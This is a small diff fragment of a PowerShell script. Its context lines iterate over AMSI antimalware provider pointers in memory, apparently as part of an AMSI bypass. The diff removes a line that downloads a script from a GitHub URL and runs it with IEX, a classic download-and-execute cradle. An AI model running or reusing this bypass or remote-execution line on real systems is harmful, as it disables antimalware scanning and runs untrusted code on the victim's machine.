@@ -33,4 +33,3 @@ while ($AntimalwareProvider -ne 0)
   $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
 }
 
-IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/MrKN16H7/tryme/main/p.ps1')
